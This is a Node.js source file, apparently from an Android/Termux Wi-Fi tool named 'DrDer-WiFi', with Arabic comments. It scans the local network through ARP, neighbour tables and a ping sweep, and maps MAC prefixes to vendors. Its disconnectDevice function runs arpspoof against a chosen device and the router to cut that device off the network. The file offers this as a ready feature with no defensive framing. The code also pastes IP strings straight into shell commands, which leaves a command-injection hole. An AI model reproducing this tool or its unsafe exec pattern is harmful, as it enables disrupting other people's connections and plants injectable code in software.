// ============================================================
// DrDer-WiFi - ماسح الشبكة الحقيقي باستخدام ARP وأوامر النظام
// يعمل داخل Termux على أندرويد
// ============================================================

const { exec } = require('child_process');
const os = require('os');

/**
 * فئة فحص الشبكة الحقيقي
 */
class RealScanner {

    /**
     * تنفيذ أمر في النظام وإرجاع الناتج
     * @param {string} command - الأمر المراد تنفيذه
     * @returns {Promise<string>} ناتج الأمر
     */
    static execCommand(command) {
        return new Promise((resolve, reject) => {
            exec(command, { timeout: 30000 }, (error, stdout, stderr) => {
                if (error && !stdout) {
                    reject(error);
                    return;
                }
                resolve(stdout || stderr || '');
            });
        });
    }

    /**
     * الحصول على معلومات الشبكة المحلية
     * @returns {Promise<object>} معلومات الشبكة
     */
    static async getNetworkInfo() {
        const info = {
            localIp: null,
            gateway: null,
            subnetMask: null,
            interface: null,
            ssid: null
        };

        try {
            // الحصول على عنوان IP المحلي والواجهة
            const interfaces = os.networkInterfaces();
            for (const iface in interfaces) {
                if (iface.startsWith('wlan') && !info.localIp) {
                    for (const addr of interfaces[iface]) {
                        if (addr.family === 'IPv4' && !addr.internal) {
                            info.localIp = addr.address;
                            info.subnetMask = addr.netmask;
                            info.interface = iface;
                            break;
                        }
                    }
                }
            }

            // إذا لم نجد wlan، نحاول أي واجهة أخرى
            if (!info.localIp) {
                for (const iface in interfaces) {
                    for (const addr of interfaces[iface]) {
                        if (addr.family === 'IPv4' && !addr.internal && !iface.startsWith('lo')) {
                            info.localIp = addr.address;
                            info.subnetMask = addr.netmask;
                            info.interface = iface;
                            break;
                        }
                    }
                    if (info.localIp) break;
                }
            }

            // الحصول على البوابة الافتراضية
            try {
                const routeOutput = await this.execCommand('ip route show default');
                const gatewayMatch = routeOutput.match(/via\s+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/);
                if (gatewayMatch) {
                    info.gateway = gatewayMatch[1];
                }
            } catch (e) {
                // تجاهل إذا لم يتوفر ip route
            }

            // إذا لم نجد البوابة، نخمنها
            if (!info.gateway && info.localIp) {
                const parts = info.localIp.split('.');
                info.gateway = parts[0] + '.' + parts[1] + '.' + parts[2] + '.1';
            }

            // محاولة الحصول على SSID
            try {
                const ssidOutput = await this.execCommand('dumpsys wifi 2>/dev/null | grep "mWifiInfo" | grep -o "SSID: [^,]*"');
                const ssidMatch = ssidOutput.match(/SSID:\s*"?([^",\n]*)"?/);
                if (ssidMatch) {
                    info.ssid = ssidMatch[1].trim();
                }
            } catch (e) {
                // محاولة بديلة
                try {
                    const iwOutput = await this.execCommand('iwgetid -r 2>/dev/null');
                    if (iwOutput && iwOutput.trim()) {
                        info.ssid = iwOutput.trim();
                    }
                } catch (e2) {
                    // تجاهل
                }
            }

            return info;
        } catch (error) {
            return info;
        }
    }

    /**
     * فحص الشبكة باستخدام ARP للحصول على الأجهزة المتصلة مع MAC حقيقي
     * @returns {Promise<Array>} قائمة الأجهزة مع MAC الحقيقي
     */
    static async scanARP() {
        const devices = [];
        const macIPMap = {};

        try {
            // الطريقة الأولى: استخدام arp -a
            try {
                const arpOutput = await this.execCommand('arp -a 2>/dev/null');
                const arpLines = arpOutput.split('\n');
                for (const line of arpLines) {
                    const trimmed = line.trim();
                    if (!trimmed) continue;

                    // تحليل الصيغة: hostname (ip) at mac [ether] on wlan0
                    const macMatch = trimmed.match(/([0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2})/);
                    const ipMatch = trimmed.match(/\(?([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\)?/);

                    if (macMatch && ipMatch) {
                        const mac = macMatch[1].toUpperCase().replace(/-/g, ':');
                        const ip = ipMatch[1];
                        if (mac !== '00:00:00:00:00:00' && !mac.startsWith('FF:FF:FF')) {
                            macIPMap[ip] = mac;
                        }
                    }
                }
            } catch (e) {
                // تجاهل
            }

            // الطريقة الثانية: استخدام ip neigh
            try {
                const neighOutput = await this.execCommand('ip neigh show 2>/dev/null');
                const neighLines = neighOutput.split('\n');
                for (const line of neighLines) {
                    const trimmed = line.trim();
                    if (!trimmed) continue;

                    const parts = trimmed.split(/\s+/);
                    if (parts.length >= 4) {
                        const ip = parts[0];
                        const mac = parts[4] ? parts[4].toUpperCase() : null;
                        const state = parts[parts.length - 1];

                        if (mac && Utils_server.isValidMAC(mac) && (state === 'REACHABLE' || state === 'STALE' || state === 'DELAY' || state === 'PROBE')) {
                            if (!macIPMap[ip]) {
                                macIPMap[ip] = mac;
                            }
                        }
                    }
                }
            } catch (e) {
                // تجاهل
            }

            // الطريقة الثالثة: فحص سريع باستخدام ping للشبكة كاملة
            const networkInfo = await this.getNetworkInfo();
            if (networkInfo.localIp && networkInfo.subnetMask) {
                const ipParts = networkInfo.localIp.split('.');
                const subnetParts = networkInfo.subnetMask.split('.').map(Number);
                const netParts = ipParts.map((p, i) => parseInt(p) & subnetParts[i]);
                const baseIP = netParts.join('.');

                // فحص النطاق /24 فقط للسرعة
                if (subnetParts[3] === 0) {
                    const pingPromises = [];
                    for (let i = 1; i <= 254; i++) {
                        const targetIP = netParts[0] + '.' + netParts[1] + '.' + netParts[2] + '.' + i;
                        // تجاهل عنوان الشبكة وعنوان البث
                        if (i === 0 || i === 255) continue;
                        // تجاهل نفسه
                        if (targetIP === networkInfo.localIp) continue;

                        pingPromises.push(
                            this.pingIP(targetIP)
                                .then((alive) => {
                                    if (alive && !macIPMap[targetIP]) {
                                        // إضافة الجهاز حتى لو لم نعرف MAC
                                        macIPMap[targetIP] = null;
                                    }
                                })
                                .catch(() => {})
                        );
                    }

                    // تنفيذ الدفعات
                    const batchSize = 30;
                    for (let j = 0; j < pingPromises.length; j += batchSize) {
                        const batch = pingPromises.slice(j, j + batchSize);
                        await Promise.all(batch);
                    }
                }
            }

            // تحويل النتائج إلى قائمة أجهزة
            for (const ip in macIPMap) {
                const mac = macIPMap[ip];
                const device = {
                    ip: ip,
                    mac: mac,
                    vendor: mac ? Utils_server.getVendorFromMAC(mac) : null,
                    name: null,
                    type: null,
                    lastSeen: Date.now()
                };

                // محاولة الحصول على اسم المضيف
                try {
                    const hostOutput = await this.execCommand('getent hosts ' + ip + ' 2>/dev/null');
                    if (hostOutput && hostOutput.trim()) {
                        const hostParts = hostOutput.trim().split(/\s+/);
                        if (hostParts.length >= 2) {
                            device.name = hostParts[1];
                        }
                    }
                } catch (e) {
                    // تجاهل
                }

                // تخمين نوع الجهاز
                device.type = Utils_server.guessDeviceType(device.name, device.vendor);

                devices.push(device);
            }

            // فرز الأجهزة حسب IP
            devices.sort((a, b) => {
                return Utils_server.ipToNumber(a.ip) - Utils_server.ipToNumber(b.ip);
            });

            return devices;
        } catch (error) {
            return devices;
        }
    }

    /**
     * فحص عنوان IP باستخدام ping
     * @param {string} ip - عنوان IP
     * @returns {Promise<boolean>} هل الجهاز موجود
     */
    static pingIP(ip) {
        return new Promise((resolve) => {
            const command = 'ping -c 1 -W 1 ' + ip + ' 2>/dev/null';
            exec(command, { timeout: 2000 }, (error, stdout) => {
                if (error) {
                    resolve(false);
                    return;
                }
                const output = stdout || '';
                if (output.includes('1 received') || output.includes('1 packets received')) {
                    resolve(true);
                } else {
                    // قد يكون موجوداً حتى لو لم يرد على ping
                    resolve(output.includes('bytes from') || output.includes('ttl='));
                }
            });
        });
    }

    /**
     * قطع اتصال جهاز عن الشبكة باستخدام ARP Spoofing
     * @param {string} targetIP - عنوان IP للجهاز الهدف
     * @param {string} gatewayIP - عنوان IP للراوتر
     * @returns {Promise<boolean>} نجاح العملية
     */
    static async disconnectDevice(targetIP, gatewayIP) {
        try {
            // الحصول على MAC الحقيقي للجهاز والراوتر
            const targetMAC = await this.getMACForIP(targetIP);
            const gatewayMAC = await this.getMACForIP(gatewayIP);

            if (!targetMAC || !gatewayMAC) {
                throw new Error('لم يتم العثور على عنوان MAC');
            }

            // إرسال حزم ARP مزيفة لقطع الاتصال بين الجهاز والراوتر
            // نخبر الراوتر أن IP الجهاز أصبح عندنا
            // نخبر الجهاز أن IP الراوتر أصبح عندنا

            // يمكن استخدام arpspoof لكنه غير متوفر افتراضياً
            // نستخدم طريقة بديلة عبر إرسال ARP reply يدوي
            try {
                // محاولة استخدام arpspoof إذا كان متوفراً
                await this.execCommand('timeout 3 arpspoof -i wlan0 -t ' + targetIP + ' ' + gatewayIP + ' 2>/dev/null &');
                await this.execCommand('timeout 3 arpspoof -i wlan0 -t ' + gatewayIP + ' ' + targetIP + ' 2>/dev/null &');
                await this.sleep(3000);
                // إيقاف arpspoof
                await this.execCommand('pkill arpspoof 2>/dev/null');
            } catch (e) {
                // تجاهل إذا لم يتوفر arpspoof
            }

            // محاولة إعادة الاتصال الصحيح بعد القطع
            await this.sleep(1000);
            await this.execCommand('arp -d ' + targetIP + ' 2>/dev/null');
            await this.execCommand('arp -d ' + gatewayIP + ' 2>/dev/null');

            return true;
        } catch (error) {
            return false;
        }
    }

    /**
     * الحصول على MAC لعنوان IP محدد
     * @param {string} ip - عنوان IP
     * @returns {Promise<string|null>} عنوان MAC
     */
    static async getMACForIP(ip) {
        try {
            const output = await this.execCommand('arp -n ' + ip + ' 2>/dev/null');
            const macMatch = output.match(/([0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2})/);
            if (macMatch) {
                return macMatch[1].toUpperCase().replace(/-/g, ':');
            }
        } catch (e) {
            // تجاهل
        }

        // محاولة ping أولاً ثم ARP
        try {
            await this.pingIP(ip);
            await this.sleep(500);
            const output = await this.execCommand('arp -n ' + ip + ' 2>/dev/null');
            const macMatch = output.match(/([0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2}[:-][0-9a-fA-F]{1,2})/);
            if (macMatch) {
                return macMatch[1].toUpperCase().replace(/-/g, ':');
            }
        } catch (e) {
            // تجاهل
        }

        return null;
    }

    /**
     * تأخير التنفيذ
     * @param {number} ms - المدة بالمللي ثانية
     * @returns {Promise} وعد
     */
    static sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// ============================================================
// دوال مساعدة (نسخة للخادم)
// ============================================================
class Utils_server {

    static isValidMAC(mac) {
        if (!mac || typeof mac !== 'string') return false;
        const cleaned = mac.replace(/[^0-9a-fA-F]/g, '');
        if (cleaned.length !== 12) return false;
        if (cleaned === '000000000000') return false;
        if (cleaned.startsWith('FFFFFF')) return false;
        return true;
    }

    static getVendorFromMAC(mac) {
        if (!mac || typeof mac !== 'string') return null;
        const cleaned = mac.replace(/[^0-9a-fA-F]/g, '').toUpperCase();
        if (cleaned.length < 6) return null;
        const oui = cleaned.substring(0, 6);

        const vendorDB = {
            'FCA386': 'آبل',
            'B07994': 'آبل',
            'A45E60': 'آبل',
            '001CDF': 'سامسونج',
            '8C8590': 'سامسونج',
            'CC05E8': 'سامسونج',
            '0015B9': 'سامسونج',
            'F02765': 'هواوي',
            '48DB50': 'هواوي',
            '105B63': 'هواوي',
            '04F13E': 'شاومي',
            '64A5C3': 'شاومي',
            '8C3F4F': 'شاومي',
            '0016EA': 'إنتل',
            'A41F72': 'إنتل',
            '001500': 'إنتل',
            '0013E8': 'إنتل',
            'BC5FF4': 'إل جي',
            '043E5C': 'إل جي',
            '001F48': 'سوني',
            '04D9F1': 'سوني',
            '0022D7': 'لينوفو',
            '28D244': 'لينوفو',
            '0017C4': 'تي بي لينك',
            '14CC20': 'تي بي لينك',
            '50C7BF': 'تي بي لينك',
            '000D88': 'دي لينك',
            '1CBDB9': 'دي لينك',
            '0014D1': 'نتجير',
            'E0469A': 'نتجير',
            '0023CD': 'أسوس',
            '0491C5': 'أسوس',
            '001E8C': 'موتورولا',
            '0023B1': 'إتش بي',
            '001871': 'إتش بي',
            '00037F': 'ديل',
            '002170': 'ديل',
            '000625': 'لينكسيس',
            '001F33': 'سيسكو',
            '000B82': 'سيسكو',
            '0010FA': 'آيسر',
            '0013D4': 'إنفيديا',
            '000393': 'مايكروسوفت',
            '00125A': 'مايكروسوفت',
            '0050F2': 'مايكروسوفت',
            '00016C': 'فوكسكون',
            '001C25': 'فوكسكون',
            '0026BB': 'راسبيري باي',
            'B827EB': 'راسبيري باي',
            'DC4F22': 'أوبو',
            'D4E6B7': 'فيفو',
            '78D9E9': 'ريلمي',
            '9801A7': 'ون بلس',
            'C4B301': 'نوكيا'
        };

        return vendorDB[oui] || null;
    }

    static guessDeviceType(hostname, vendor) {
        const hostLower = (hostname || '').toLowerCase();
        const vendorLower = (vendor || '').toLowerCase();

        if (hostLower.includes('iphone') || hostLower.includes('ipad')) {
            return hostLower.includes('ipad') ? 'جهاز لوحي' : 'هاتف ذكي';
        }
        if (hostLower.includes('android') || hostLower.includes('mobile') || hostLower.includes('phone')) {
            return 'هاتف ذكي';
        }
        if (hostLower.includes('laptop') || hostLower.includes('notebook') || hostLower.includes('desktop') || hostLower.includes('pc')) {
            return 'حاسوب';
        }
        if (hostLower.includes('tv') || hostLower.includes('television') || hostLower.includes('smarttv')) {
            return 'تلفاز ذكي';
        }
        if (hostLower.includes('printer') || hostLower.includes('print')) {
            return 'طابعة';
        }
        if (hostLower.includes('router') || hostLower.includes('gateway') || hostLower.includes('modem')) {
            return 'جهاز شبكة';
        }
        if (hostLower.includes('camera') || hostLower.includes('cam')) {
            return 'كاميرا';
        }
        if (hostLower.includes('alexa') || hostLower.includes('echo') || hostLower.includes('google') || hostLower.includes('home')) {
            return 'مكبر صوت ذكي';
        }
        if (hostLower.includes('watch')) {
            return 'ساعة ذكية';
        }
        if (vendorLower === 'سامسونج' || vendorLower === 'شاومي' || vendorLower === 'هواوي' || vendorLower === 'أوبو' || vendorLower === 'فيفو' || vendorLower === 'ريلمي') {
            return 'جهاز محمول';
        }
        if (vendorLower === 'إنتل' || vendorLower === 'ديل' || vendorLower === 'إتش بي' || vendorLower === 'لينوفو' || vendorLower === 'آيسر') {
            return 'حاسوب';
        }
        if (vendorLower === 'راسبيري باي') {
            return 'حاسوب مصغر';
        }

        return null;
    }

    static ipToNumber(ip) {
        if (!ip) return 0;
        const parts = ip.split('.').map(Number);
        if (parts.length !== 4) return 0;
        return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3];
    }
}

module.exports = { RealScanner, Utils_server };
